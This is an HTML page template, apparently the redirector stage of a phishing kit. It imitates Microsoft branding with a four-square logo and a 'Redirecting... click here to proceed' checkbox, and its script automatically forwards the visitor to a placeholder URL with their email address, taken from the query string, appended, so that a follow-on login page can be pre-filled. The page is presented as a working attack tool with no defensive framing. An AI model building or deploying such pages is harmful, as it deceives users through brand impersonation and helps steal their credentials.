<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#9929;</title>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(redirect, 398);
        });

        // Fun
        function redirect() {
            var email = getParameterByName('email'); // Atr
            var redirectUrl = "{{REDIRECT_URL}}";

            if (email) {
                redirectUrl += email; // Apd
            } else {
                console.log("No email provided. Redirecting without email.");
            }

            console.log("Redirecting to: " + redirectUrl);
            window.location.href = redirectUrl;
        }

        // Fun
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            var results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // Fun
        function handleCheckboxClick(checkbox) {
            if (checkbox.checked) {
                console.log("Checkbox is checked. Redirecting...");
                redirect();
            } else {
                console.log("Checkbox is not checked.");
            }
        }
    </script>
</head>
<body>
  <div style="font-size: 14px; padding: 0px; text-align: left;">    
    <label>
        <input type="checkbox" onclick="handleCheckboxClick(this)">
        Redirecting... click here to proceed.
    </label> 
    <div style="display: flex; justify-content: center; align-items: center; font-family: Arial, sans-serif; margin-top: 500px;">
      <div style="display: flex; flex-direction: column; align-items: center;">
        <!-- First row -->
        <div style="display: flex; justify-content: center;">
          <div style="width: 9px; height: 9px; background-color: #F25022; margin-right: 1px;"></div>
          <div style="width: 9px; height: 9px; background-color: #7FBA00;"></div>
        </div>
        <!-- Second row -->
        <div style="display: flex; margin-top: 1px; justify-content: center;">
          <div style="width: 9px; height: 9px; background-color: #00A4EF; margin-right: 1px;"></div>
          <div style="width: 9px; height: 9px; background-color: #FFB900;"></div>
        </div>
      </div>
      <div style="font-size: 19px; font-weight: normal; color: #5E5E5E; margin-left: 5px;">
        Microsoft
      </div>
    </div> 
  </div>  
</body>

</html>
